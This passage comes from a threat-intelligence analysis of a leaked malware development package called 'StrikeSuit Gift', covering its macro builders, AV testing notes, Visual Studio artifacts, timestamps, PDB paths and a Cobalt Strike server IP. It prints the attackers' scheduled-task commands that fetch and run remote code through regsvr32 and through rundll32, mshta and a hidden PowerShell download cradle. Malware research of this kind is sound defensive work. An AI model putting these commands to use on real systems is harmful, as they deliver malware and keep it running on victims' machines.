At this point, we see that the blob payload is a generic executable created to test their loaders, without risking self-infection or making callouts to live C2 infrastructure. While this seems obvious and sensible, there are several assessments we can make from this knowledge. The first is their development capabilities are not the same as those conducting the attacks. This is supported also by the aforenoted use of GUIs, which can easily be used by less technical operators conducting attacks. Furthermore, the development team is sharp enough to not test their kit using actual offensive tooling, reducing the risk of accidentally leaking a final payload. The careful handling does not necessarily imply they are an apex predator, yet it shows that this developer took some of the basic steps to avoid accidentally leaking sensitive information. But no matter the sophistication, malware developers are always human, and all humans make mistakes.

#### The Typical VB Macro Content

For most of the macro content across all of the StrikeSuit Gift projects, the macros were mainly used to create scheduled tasks that would download additional payloads in a couple of ways. One way uses the `regsvr32.exe` remote download technique sometimes referred to as “Squiblydoo.” 

```vbscript
sCMDLine = "schtasks /create /sc MINUTE /tn ""Windows Media Sharing"" /tr ""\""regsvr32.exe\"" /s /n /u /i:http://server/file.sct scrobj.dll"" /mo AAAREGSVR32AAA"
```

The other way uses an XML scheduled task with `rundll32.exe `and arguments to have `mshta` to execute VB script that would run a PowerShell download. 

```xml
<Command>rundll32.exe</Command>
<Arguments>mshta vbscript:Execute("CreateObject("WScript.Shell").Run"powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://powershell.server'))""", 0:code close")</Arguments>
```

---

## Chapter IV

> _“It is not good to refuse a gift." Homer_

### StrikeSuit Malware Development Conventions

When reacting to intrusions and campaigns around the world, analysts and researchers are often left to speculate on the adversary’s capabilities, the tradecraft involved, and the details surrounding the original malware development environment. However, when we have the source code, we get a better picture of what was going on behind the scenes. What we see here largely matches our expectations, and yet we learn that malware developers are really no different than software developers.

#### Documenting Antivirus and Compatibility Testing

Whether you work in IT or the SOC, whether you throw down on NTFS or pcap, whether you work in Sublime or VS Code, you are probably stuck in a world of note taking, testing, and documentation. Those developing malware face the same challenges in terms of planning, assessing efficacy, and tracking bugs and enhancements over time. In the _StrikeSuit Gift_ package we see evidence of the malware development team performing testing of Office documents on a select set of antivirus solutions.

The verbatim excerpt below is from the file `AVs-Test/Result.txt` and demonstrates that this developer’s macro solution was absolutely crushing AV as of August 24, 2017. 

```
* AV update ngay 2017/08/24

					Office 2010 x86
- 360 CN					O	
- 360 Total Security				O
- AVG IS					O
- Avast						O
- BitDefender					O
- BKAV						O
- CMC						O
- Eset						O
- KIS				Trojan-Downloader.Script.Generic
- McAfee					O
- NIS						O
- Panda IS					O
- Sophos					O
- Synmantec					O
- Windows Defender				O
```

Many of these names you are familiar with and some acronyms for household names. For those that aren’t obvious, KIS is probably Kaspersky and NIS is probably Norton. It’s worth highlighting a two lesser-known names in the list above:
- __BKAV__ is likely a reference to __Bkav Corporation__ which is one of the more popular antivirus providers in Vietnam (https://www.bkav.com.vn/home) 
- __CMC__ is likely a reference to __CMC Cyber Security__, another Vietnam-centered antivirus provider (https://cmccybersecurity.com/en/cmc-antivirus-free/) 

Beyond antivirus testing, we see that the malware developers were assessing compatibility with a handful of Microsoft Office versions. The excerpt below is from `Office-Versions/Verions.txt` and it is clear that the tooling needs some enhancements.

```
Work:
- Office 2010 x86
- Office 2013 x86
- Office 2016 x86

Fail:
- Office 2003
- Office 2007
- Office 2010 x64 (Type mismatch)
- Office 2013 x64 (Type mismatch)
- Office 2016 x64 (Type mismatch)
```
---

### Feature Testing, Housekeeping and Fingerprints

Throughout the source codebase we see common conventions of software development. Malware developers face many of the same technological and organizational challenges that any software developer does. They need to test small features, and build incremental capabilities that work together. They need to keep their folder trees tidy, and they need to backup their code in case they make any catastrophic mistakes. They need to keep track of their tasks, their OKRs and MBOs. They’re doing the same job, on the other side of the grind. They’re only human and accordingly they can’t help but leave dirty human fingerprints across all their digital work.

#### Cleaning up the Development Mess with `_Cleanup.bat` 

Along with the Macros_Builder project we find a batch file named _Cleanup.bat that appears designed to delete unnecessary artifacts from the development system. According to 7-zip the last modified time is sometime around 2013-10-29 00:18, so perhaps this cleanup script was used and copied around from drive to drive, project to project, to allow the developers to quickly scrub their workstations or directories as needed. 

File Path: `P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\Macros_Builder\`
File Name: `_Cleanup.bat`
File Size: `3840`

Excerpt of `_Cleanup.bat` begins with a warning, and a commented out loop for deleting Visual Studio Solutions User Options (.SUO) files, after which there is a long list of for loops with different files to delete.

```bat
@echo off
echo Warning!! This file can delete wanted/needed files! Use with caution!
echo Hit enter to continue using this file, or close it if you do not want to run it.
REM pause

for /f "tokens=1 delims=" %%a in ('dir /b /s *.ncb') do (
del /Q "%%a"
echo %%a deleted.
)

REM Dont delete config of VS
REM  /////////////////////////////////////////////////////////////////////////
REM for /f "tokens=1 delims=" %%a in ('dir /b /s /A:H *.suo') do (
REM attrib -H "%%a"
REM del /Q "%%a"
REM echo %%a deleted.
REM )
REM  /////////////////////////////////////////////////////////////////////////
```

Neither the exact batch scripting nor the file types are particularly illuminating. This doesn’t look like a malware developer “covering their tracks” but rather a tidy programmer wanting an easy, scriptable way to delete chaff that may come from different versions of Visual Studio and different linkers and compilers and code artifacts that span many generations of development technology.

|File Names or Extensions|Note|
|---|---|
|`*.ncb`|Visual C++ IntelliSense Database|
|`*.suo`|Visual Studio Solutions User Options (excluded)|
|`*.tlh`|C/C++ Type Library Header|
|`*.tli`|C/C++ Type Library Implementation|
|`*.sdf`|Visual Studio Code Browser Database|
|`*.user`|Visual Studio User Options|
|`*BuildLog.htm`|Visual Studio Build Log (pre-VS2010)|
|`*.ilk`|Visual Studio Incremental Linking|
|`*.pdb`|Program Database/Debug Symbols|
|`*.idb`|Visual Studio Intermediate Debug File|
|`*.obj`|Visual Studio Object|
|`*.pch`|Precompiled Header|
|`*.ipch`|IntelliSense Precompiled Header|
|`*.tlog`|MSBuild File Tracker Log|
|`*.vshost.exe`|Visual Studio Hosting IDE Process|
|`*.vshost.exe.config`|Visual Studio Hosting IDE Process|
|`*.vshost.exe.manifest`|Visual Studio Hosting IDE Process|
|`*.old`|?|
|`*.stdafx.obj`|Visual Studio Precompiled Header Object|
|`*.exp`|Exported Functions Data|
|`*.Build.CppClean.log`|CPPClean Task Log (?)|
|`*.lastbuildstate`|MSBuild (?)|
|`*.intermediate.manifest`|Visual Studio Manifest|
|`*.embed.manifest`|Visual Studio Manifest|
|`*.embed.manifest.res`|Visual Studio Manifest|
|`*mt.dep`|Visual Studio Manifest|
|`*.Cache`|Visual Studio|
|`*Properties.Resources.resources`|Visual Studio|
|`*Form1.resources`|Visual Studio|
|`*csproj.FileList.txt`|Visual Studio|
|`*.csproj.FileListAbsolute.txt`|Visual Studio|
|`*.sbr`|Visual Studio Intermediate Symbolic Data|
|`*.bsc`|Visual Studio Browser Symbol Data|

We couldn’t find much evidence of this batch file in other places, but we came up lucky on a Github search and arrived at this page, which has a nearly word-for-word copy of the batch script functionality: https://github.com/aangaymoi/DALHelper/blob/main/.sln.clean.bat. There are only slight differences between StrikeSuit’s  `_Cleanup.bat` and aangaymoi’s `.sln.clean.bat` script. The former has the .SUO loop commented out, and was present back in 2017, whereas the latter was saved to Github in 2021 and does not exclude the .SUO deletion. 

Still, in the _StrikeSuit Gift_ package, it seems as though the `_Cleanup.bat` script was never run, so we will let this investigative thread dangle in the wind for now, and move on to look at the artifacts of the development process such as the .SUO files.

#### Visual Studio Solution User Options (.suo) Analysis

We were lucky enough to capture a copy of the source code package before the `_Cleanup.bat` script was run, so we obtained copies of lots of nitty gritty files that come along with Visual Studio development including Solution User Options (.suo) files. This is uncommon and these files are not parsed by common aftermarket tooling so we are left exploring the data structures to look for interesting tidbits that we might tease out of the saved states of each of the solutions.

The table below shows the unique SUO files from the _StrikeSuit Gift_ package.

| File MD5 | Size | Path |
| --- | --- | --- |
|`f5236b5460f0ccbce6ada486971f8822`|`46592`|`Macros_Builder_1_0_unzip/Macros_Builder.v11.suo`|
|`74f348b26d6001e7031a2df28ffd6022`|`52224`|`Macros_Builder/Macros_Builder.v11.suo`|
|`2a095e91df57bba102da019271f5cfc4`|`74752`|`WebBuilder_unrar/HtaDotNet/HtaDotnet.v11.suo`|
|`154baaa4b752112bb01c810eefdee2c0`|`65536`|`WebBuilder/HtaDotNet/HtaDotnet.v11.suo`|
|`fc72ee04b9ea2d59c37129ec28d4fdf3`|`46592`|`WebBuilder/ShellcodeLoader/.vs/L/v14/.suo`|
|`eb5559fe5906111077fd7bb8f4d6c165`|`22016`|`WebBuilder/ShellcodeLoader/L.suo`|
|`4ba0391868475f8c37d363d0453088f6`|`29696`|`Binary/Binary.v11.suo`|
|`02fecb2fe516df6febdb91f73f49047b`|`33792`|`ShellcodeThreadCaller/ShellcodeThreadCaller.v11.suo`|
|`00ef5903d48a729032639a57c3931b13`|`71168`|`MacrosEmbedding/.vs/MacrosEmbedding/v14/.suo`|
|`5b85e1e4def126961860c4b0b49e40b1`|`35840`|`MacrosEmbeddingExample/.vs/MacrosEmbeddingExample/v14/.suo`|
|`a55f547dcd1cac096de7951f1176734c`|`56832`|`VbaCodeCreator/.vs/VbaCodeCreator/v14/.suo`|
|`9f8d7575033d7c963781ac7af005826c`|`46080`|`ShellcodeLoader/ShellcodeLoader.v11.suo`|
|`2d9507ad961477d2045d200764dd409d`|`35328`|`XmlScriptAnalyst/XmlScriptAnalyst.v11.suo`|


Thanks to [a tip from some friends](https://twitter.com/williballenthin/status/1493737884683169797), we see that we can use the MiTeC Structured Storage Viewer to navigate through the portions of the SUO data structure.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/06-MiTeC%20SSV.png "SSV to view SUOs")

Running through all the SUO file structures is laborious and didn’t yield much more than a strings dump would have done anyway. We find paths to source code files, project names, et cetera.

We can infer from the myriad of references in `XmlPackageOptions`, `OutliningStateDir` etc that the `HtaDotnet` and `ShellcodeLoader` solutions were originally under the folder path `G:\WebBuilder\Gift_HtaDotnet\`. This is also supported by the PDB paths of older built binaries within the broader _StrikeSuit Gift_ package.

From looking at DebuggerWatches values in other projects we can see that the malware developer was actively debugging the historical programs.

|SUO File|DebuggerWatches|
|---|---|
|`WebBuilder/HtaDotNet/HtaDotnet.v11.suo` | `result` |
|`WebBuilder/ShellcodeLoader/.vs/L/v14/.suo`|`(char)77`|
|`WebBuilder/ShellcodeLoader/L.suo`|`(char)77`|

The examination of SUOs was a fruitless exercise, and something of a dead end, but it was an important one to capture. Not all investigative threads turn up DNA and fingerprints. Sometimes they are just another vignette, and another ephemeral glimpse into the elusive life of a malware author.

There’s nothing mind blowing from this SUO inspection because these structures do not give us any great insights that the source code does not already provide. However, should you happen to find .SUO files without accompanying source code, these files could be rich in information about the Visual Studio solution, the malware author, or the original development environment.

---

### Development In Progress

#### Testing Features and Functions

Analysis of this source code package is messy because it is non-linear and involves multiple timelines. Still, we see the iterative nature of development, and how the malware authors tried and tested small capabilities before integrating them into other projects. Development was clearly in progress at the time this package was leaked and we can see a few examples of this.

For example, `XmlStrAnalyst` was a simple VB project to write an XML scheduled task to disk. This project was built around 8/16/2017, appearing as a  precursor to the functionality which was later pushed as an enhancement into the updated version of `Macros_Builder` which was modified to use XML scheduled tasks.

#### Backup Structure

Obviously, when you are expanding upon a piece of older code that works, you don’t want to mess it up with alterations. What’s the first thing you do? You back it up! The malware developer who was working on this project created archive copies of WebBuilder.rar and Macros_Builder.zip to protect these older, working projects.

#### Macro Comparisons

There were two different versions of `MacrosSource.txt` in the source code package. Through diffing these files, we see active development and testing of the macro content.

Path in `P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\`
|File|Size|Modified Time|
|---|---|---|
|`Macros_Builder\Macros_Builder\MacrosSource.txt`|`14057`|`3/10/2016 23:40:00`|
|`Macros_Builder\Macros_Builder\bin\Debug\MacrosSource.txt`|`18219`|`7/19/2016 21:34:00`|


Using Visual Studio Code’s built-in comparison capability, we can highlight the line-by-line differences in these two files. The most notable difference is mid 2016 there is a modification to `MacrosSource.txt` with adjustments to `SpawnBase63` procedure, to include incorporating an XML scheduled task for persistence and execution of the remote download. This change is partially because the `Macros_Builder` program has a modified `add_schedule_vba.txt` which is the source for the macro content, and it seems as though the developer ran the debug build of this program with input to the GUI, leaving us some juicy network toolmarks of a C2 server that may have been used during testing. How exciting! We know. But hold your horses, we will dive into these details in just a few more pages.
	
![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/07-MacroDiff.png "VS Code Diff of two 2016 versions of MacrosSource.txt")
![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/08-MacroDiff2.png "VS Code Diff of two 2016 versions of MacrosSource.txt")

There are also two copies of `add_schedule_vba.txt`, one of which is in an older zip archive of the `Macros_Builder` project. The only change in this file was the addition of additional quotation marks in the `XMLStr` macro arguments for the PowerShell download. Development was obviously in progress.

Path in `P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\`
|File|Size|RAR Modified Time|
|---|---|---|
|`Macros_Builder.zip\Macros_Builder\Resources\add_schedule_vba.txt`|`18115`|`9/08/2016 03:44:00`|
|`Macros_Builder\Macros_Builder\Resources\add_schedule_vba.txt`|`18133`|`8/17/2017 21:23:00`|

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/09-VBAdiff.png "VS Code Diff for add_schedule_vba.txt")
	
---

### Borrowed and Repurposed Open Source Code

The last piece of assessing the totality of this source code was to look at the various solutions, projects and components and think about which pieces were borrowed or “liberated” from open source code projects. While this may not shed light on the future of the malware projects we see here, understanding the use of public code speaks to the developers' inspirations.

__`VB/ShellcodeLoader/ShellcodeLoader.vb`__ and __`CSharp/VbaCodeCreatorvba_code_builder.txt`__

- These components contain age-old macro content with variable names originally generated by scriptjunkie and used in 2012 blog post https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/

- This exact code, with randomized variables `Zopqv Hyeyhafxp Xlbufvetp` etc are used verbatim across many derivative projects (rather than generating original VB code from MSF) so it may not be directly sourced from this blog, but it is clear that the code was not generated using meterpreter by the developer, so obviously it was copypasta’d from somewhere around the internet. 
- `vba_code_builder.txt` uses same VBA7 top block with variables `Zopqv Dkhnszol` and so forth but then uses some variables to replace with shellcode substitutions, these are later replaced in `Core.cs`.

__`Macros_Builder/add_schedule_vba.txt`__
	
- This component contains Base64Encode2 and other functions that may have been sourced directly from https://www.source-code.biz/snippets/vbasic/Base64Coder.bas.txt 
- Other values such as Types `STARTUPINFO` and `SECURITY_ATTRIBUTES` and more could have been taken directly from ancient VB samples such as https://www.vbforums.com/showthread.php?172679-Shell

__`WebBuilder/HtaDotNet/HtaDotnet.cs`__ and __`WebBuilder/ShellcodeLoader/Test/Program.cs`__

- These pieces contains several function names originally seen in James Forshaw’s DotNetToJScript such as Deserialize_2 BuildLoaderDelegate etc, see https://github.com/tyranid/DotNetToJScript/tree/4dbe155912186f9574cb1889386540ba0e80c316/DotNetToJScript/Resources and https://github.com/tyranid/DotNetToJScript/blob/4dbe155912186f9574cb1889386540ba0e80c316/DotNetToJScript/Program.cs 

__`Macros_Builder/_Cleanup.bat`__
	
- This cleanup script does not have much public presence, at least not much that is easily searchable. But in February 2021, a very similar script showed up on Github https://github.com/aangaymoi/DALHelper/blob/main/.sln.clean.bat.

---

## Chapter V

> _“Gifts weigh like mountains on a sensitive heart.”_ Shakespeare

### Stockpiling the Unique Toolmarks and Indicators

If you’ve made it this far in the story, you are desperately aching to see connections to APT32. But don't rush this! Let the suspense wash over you and enjoy this moment. This is the job, and we’re taking our sweet time with it. 

Before we hit you with the attribution angles, let’s reassess the surface area of all this data and bubble up the unique values that could be helpful in searching for connections. To get us started, we searched through all of the files, source code, notes and compiled builds, and extracted toolmarks, names, file paths, IP addresses, GUIDs, timestamps, and other dirty developer fingerprints.

#### Usernames, Handles and Hostnames

We extracted a variety of usernames and handles from the various files. It is clear that there are a couple players at work here, though we do not get much information beyond simple names and a default Windows hostname.

|Names|Notes|
|---|---|
|`toxic`|`ReadMe.txt`, with Open date of 2017-08-11|
|`Rachael`|From PDB paths and test paths inside source code|
|`Arnold`|Author name in `test.doc` created 2017:08:25 08:30:00|
|`WIN-FF211E5QDM2\Rachael`|Embedded in `XmlStr.txt` after `Rachael` executed `XmlScriptAnalyst.exe`|

---

#### Distinct Macro Timestamps from a Scheduled Task XML File

##### Seven Digit Decimals in a Timestamp

One oddly notable project in the _StrikeSuit Gift_ package is `XmlStrAnalyst` which seems to be a test for building or modifying XML scheduled tasks, and it uses VB code to write to an outfile `XmlStr.txt`. 

Looking at the top of the `XmlStr.txt` document we see it is indeed raw XML for a Windows scheduled task. What stands out immediately are very unique timestamps that speak to the potential age of the original malware development. 

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo>
    <Date>2016-06-02T11:13:39.1668838</Date>
    <Author>WIN-FF211E5QDM2\Rachael</Author>
  </RegistrationInfo>
<Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PTBBBPOWERBBBM</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
</Repetition>
      <StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary>
      <Enabled>true</Enabled>
</TimeTrigger>
  </Triggers>
```


These hard-coded timestamps are observed in both `Macros_Builder`’s `add_schedule_vba.txt` and `XmlScriptAnalyst`’s `Module1.vb` and are subsequently written into `MacrosSource.txt` and `XmlStr.txt` when `Macros_Builder.exe` or `XmlScriptAnalyst.exe` are executed, respectively. 

It may be worthwhile to note that these are unique timestamps and at first glance it seems odd that the timestamps have seven digits of precision after the seconds value. With seven digits, we know it’s not milliseconds, it's not microseconds, it’s not nanoseconds. So how exactly did these seven digit timestamps get made, anyway? We presume it has to be created by Windows, somehow. 

```
2016-06-02T11:13:39.1668838
2016-06-02T11:12:49.4495965
```

##### Testing the Export of Scheduled Tasks XML

The simplest explanation for the timestamps above is that before this was put into any VB script or Visual Studio solution, the malware developer created and exported an XML scheduled task using the Windows Task Scheduler and used that as template for the `Macros_Builder` and `XmlScriptAnalyst` projects. To test this theory, we jump into a VM and try to recreate how a malware author might create and export the Scheduled Task XML.

Step 1: Using the Windows Task Scheduler we create a test task.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/11-XML-2.png "Step 1")


Step 2: We create a trigger to initiate the task once and we select the repeat task every one hour and set the duration to Indefinitely. Note that the start time we select here will be `2022-03-02 at 8:41:05AM` (EST in our Virtual Machine).

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/10-XML-1.png "Step 2")

Step 3: We create an action for the task to run `rundll32.exe` with arguments to execute a VB scriptlet.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/12-XML-3.png "Step 3a")
![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/13-XML-4.png "Step 3b")

Step 4: We finalize the Scheduled Task, then right click the task entry and export to an XML file.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/15-XML-6.png "Step 4")

Step 5: We view the exported scheduled task XML and see that it indeed contains the date timestamps with seven points of decimal precision. Further, we see that the Task Scheduler embeds the author computer name and user name in our test file. We confirm that the RegistrationInfo Date timestamp is when we created the task, and the Trigger StartBoundary timestamp is when our task is set to begin. What a joyous day.

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2022-03-02T08:43:01.7591912</Date>
    <Author>user-PC\user</Author>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2022-03-02T08:41:05.5580189</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
...
  <Actions Context="Author">
    <Exec>
      <Command>rundll32.exe</Command>
      <Arguments>mshta vbscript:Execute("CreateObject("WScript.Shell").Run"powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://powershell.server'))""", 0:code close")</Arguments>
    </Exec>
  </Actions>
</Task>
```

The XML for a Scheduled Task is not generated unless you export it, so we can guess that Windows is storing the information used to create the XML somewhere in the registry. Using `regedit.exe`, we pull up `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\` to browse around Tasks keys and we see that there is a registry key for our `Time Test Task`, where the DynamicInfo key stores what is likely to be related to our Date timestamp. 
 
![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/16-XML-7.png "Task timestamp from registry.")

This value `1E7B9C6F3B2ED801` is a [Windows FILETIME](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime?redirectedfrom=MSDN), a 64-bit structure containing the number of 100-nanosecond intervals since Jan 1, 1601. [Using CyberChef we can convert `1E7B9C6F3B2ED801`](https://gchq.github.io/CyberChef/#recipe=Windows_Filetime_to_UNIX_Timestamp('Milliseconds%20(ms)','Hex%20(little%20endian)')Parse_DateTime('UNIX%20timestamp%20offset%20(milliseconds)','x','UTC')&input=MUU3QjlDNkYzQjJFRDgwMQ) to a more human readable format using the Windows Filetime to UNIX Timestamp operation which confirms this hex value is `2022-03-02 at 13:43:01 UTC` (or 8:43 AM EST). In Windows, `w32tm.exe` takes 10^-7s (100 nanosecond) intervals and converts to readable format. 

The value `1E7B9C6F3B2ED801` in Int64 is `132907021817903902`. Passing that value into `w32tm.exe` gives us this:
```
C:\Users\user\Desktop>w32tm.exe /ntte 132907021817903902
153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM
```

Of course after doing all of that we find out there is an easier way, and we can pass the byte flipped hex of the original value: 
```
C:\Users\user\Desktop>w32tm.exe /ntte 0x01D82E3B6F9C7B1E
153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM
```

Well, we can see that `w32tm.exe` presents this timestamp to us just like we expected and with the expected seven digits of precision, though it is not clear how or why the last 7 digits are different from what we see in our XML timestamp. Naturally, as with all things in forensics, you have to know what your tools are doing behind the scenes to understand if they are summarizing or truncating numbers and to what degree of specificity, let alone the correct time offset. Timestamps, amirite. 

##### Developer Fingerprints in Scheduled Task XML

When we switch back to looking at `XmlStr.txt`, we see that this XML contains the original malware developer’s computer name, user name, and timestamps that likely indicate the approximate date on the development system when the XML script content was originally created, around the time it was used to create macros in the 2016 version of `Macros_Builder`. 

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo>
    <Date>2016-06-02T11:13:39.1668838</Date>
    <Author>WIN-FF211E5QDM2\Rachael</Author>
  </RegistrationInfo>
<Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PTBBBPOWERBBBM</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
</Repetition>
      <StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary>
      <Enabled>true</Enabled>
</TimeTrigger>
  </Triggers>
```

One final nugget of interest is the interval value `PTBBBPOWERBBBM`. This is a value that was altered from the original exported XML to be a placeholder value that would be changed depending on values entered in the GUI of the Macros_Builder program. Except this value it is never referenced. Instead, in the `Macros_Builder` `Form1.cs` checks the macro content to replace the value `BBBPOWERBBB`. This is one of many small errors that shows that the program is obviously undergoing development at the time of interception.

If you’re a seasoned Windows forensicator you’re likely already familiar with a myriad of Windows timestamp shenanigans, and none of this is new or surprising to you. So why should you care and why does any of this timestamp business matter? Well, seeing seven digits of precision in an XML scheduled task may indicate that it was created and exported by the Windows Task Scheduler. This structure of the timestamp can be used for detection purposes to highlight content that was generated with this approach.
	
#### Network-based Indicators

The `MacrosSource.txt` file stored output from an execution of the newer debug build of `Macros_Builder`, leaving us these IP addresses that may have been used for testing of the macro downloader functionality.

|Source File|NBI|
|---|---|
|`MacrosSource.txt`|`http[:]//86.105.18.241:80/images/pic1.jpg`|
|`MacrosSource.txt`|`http[:]//86.105.18.241:80/download/upload.php`|


Fox IT spotted this IP address as a CobaltStrike server between 2016 and 2018, which roughly lines up with our early timeline for the Macros_Builder development. 

|IP|Port|First Seen|Last Seen|
|---|---|---|---|
|`86.105.18.241`|`80`|`2016-07-19`|`2018-10-08`|

- https://blog.fox-it.com/2019/02/26/identifying-cobalt-strike-team-servers-in-the-wild/ 
- https://github.com/fox-it/cobaltstrike-extraneous-space/blob/master/cobaltstrike-servers.csv

---

#### PDB Paths

Several of the _StrikeSuit Gift_ projects were compiled in debug mode leaving us clear paths to the PDB symbol files, pointers to the debug symbols that reflect information about the original development directories. Though we cannot necessarily trust these compile timestamps to indicate the true genesis time, these paths and timestamps together paint a fuzzy evolutionary timeline from old to new code and capabilities. 

|hash.md5|pe.timestamp|pe.pdb_path|
|---|---|---|
|`850b062d81975c438f2ab17f4a092c96`|`2008-09-01 18:48:30 (1220309310)`|`g:\\WebBuilder\\Gift_HtaDotNet\\ShLdr\\obj\\Debug\\ShLdr.pdb`|
|`80e2a8e2f51e22d96166cdb1f3d8a343`|`2009-05-16 07:47:06 (1242474426)`|`G:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\Test\\obj\\Release\\Test.pdb`|
|`c71f9ef260213917635609d16656e33d`|`2009-05-16 07:47:14 (1242474434)`|`G:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\L\\obj\\Debug\\L.pdb`|
|`e978b51735c75b047822ae6572538bbf`|`2009-05-16 07:47:14 (1242474434)`|`G:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\Test\\obj\\Debug\\Test.pdb`|
|`06f47674da70f97b6e2ff5ec11921ed7`|`2009-05-16 09:44:30 (1242481470)`|`g:\\WebBuilder\\Gift_HtaDotNet\\HtaDotNet\\HtaDotnet\\obj\\Debug\\HtaDotnet.pdb`|
|`6bfdbd8a2b8adeb20681fa558498429d`|`2009-05-16 09:44:31 (1242481471)`|`g:\\WebBuilder\\Gift_HtaDotNet\\HtaDotNet\\Test\\obj\\Debug\\Test.pdb`|
|`78473ef1282112dc6dc5d03d4053372f`|`2009-05-16 09:44:40 (1242481480)`|`g:\\WebBuilder\\Gift_HtaDotNet\\HtaDotNet\\Test\\obj\\Release\\Test.pdb`|
|`ce985259ba7a962f39c48f157e31f5aa`|`2013-10-08 12:00:51 (1381248051)`|`d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\MacrosEmbedding\\MacrosEmbedding\\obj\\Debug\\MacrosEmbedding.pdb`|
|`1a54a5af55fa7210f0f6e7b8118661ff`|`2013-10-08 12:08:52 (1381248532)`|`d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\VbaCodeCreator\\VbaCodeCreator\\obj\\Debug\\VbaCodeCreator.pdb`|
|`d1c8da885b9f283cf2114e53fee43fe0`|`2016-01-26 04:18:22 (1453799902)`|`d:\\Source\\visual\\Embed Office\\NtfsStreams\\Trinet.Core.IO.Ntfs\\obj\\Debug\\Trinet.Core.IO.Ntfs.pdb`|
|`feda9657a38618054fe95a07dad54598`|`2016-03-11 04:02:13 (1457686933)`|`d:\\Source\\visual\\Embed Office\\Office Macros\\Macros_Builder\\Macros_Builder\\obj\\Release\\Macros_Builder.pdb`|
|`4bfb1d2889d29936c72513c9e187937e`|`2016-04-06 21:18:55 (1459991935)`|`d:\\Source\\visual\\VBScript ADS Loader\\Macros_Builder\\Macros_Builder\\obj\\Debug\\Macros_Builder.pdb`|
|`c0ea1573b006ab4b419af0e6b29df550`|`2016-07-20 00:32:49 (1468989169)`|`d:\\Source\\visual\\VBScript ADS Loader\\Macros_Builder\\Macros_Builder\\obj\\Debug\\Macros_Builder.pdb`|
|`8d74fc0ef81b32f73c0797ec2a03e677`|`2017-08-14 00:31:58 (1502685118)`|`D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\CSharp\\MacrosEmbeddingExample\\MacrosEmbeddingExample\\obj\\Debug\\MacrosEmbeddingExample.pdb`|
|`e1a3d0eb585567a69eb2a0606b622e10`|`2017-08-17 00:03:09 (1502942589)`|`D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\VB\\XmlScriptAnalyst\\XmlScriptAnalyst\\obj\\Debug\\XmlScriptAnalyst.pdb`|
|`de1e7c29d98778fd7fbb832bd599b367`|`2017-08-17 04:18:44 (1502957924)`|`d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\Macros_Builder\\Macros_Builder\\obj\\Debug\\Macros_Builder.pdb`|
|`d4251964e97e72258be9cf1acf222bf3`|`2017-08-22 00:18:26 (1503375506)`|`d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\WebBuilder\\ShellcodeLoader\\L\\obj\\Debug\\L.pdb`|
|`0f02cf16b466a7bd2643ef01e09fc6d0`|`2017-08-22 00:18:30 (1503375510)`|`d:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\WebBuilder\\ShellcodeLoader\\Test\\obj\\Debug\\Test.pdb`|
|`84113138ed90ab303a4dd1eedc6a6f19`|`2017-08-23 04:44:28 (1503477868)`|`D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\C_Cpp\\Binary\\Debug\\Binary.pdb`|
|`e2a9f698cb6aa417bae41ce02d0555da`|`2017-08-23 07:01:51 (1503486111)`|`D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\C_Cpp\\ShellcodeThreadCaller\\x64\\Debug\\ShellcodeThreadCaller.pdb`|
|`77374f452700e17f3fe8c959db3d9f23`|`2017-08-23 07:02:11 (1503486131)`|`D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Source\\C_Cpp\\ShellcodeThreadCaller\\Debug\\ShellcodeThreadCaller.pdb`|


### Threadwork of Attribution and Assessing Connections to APT32

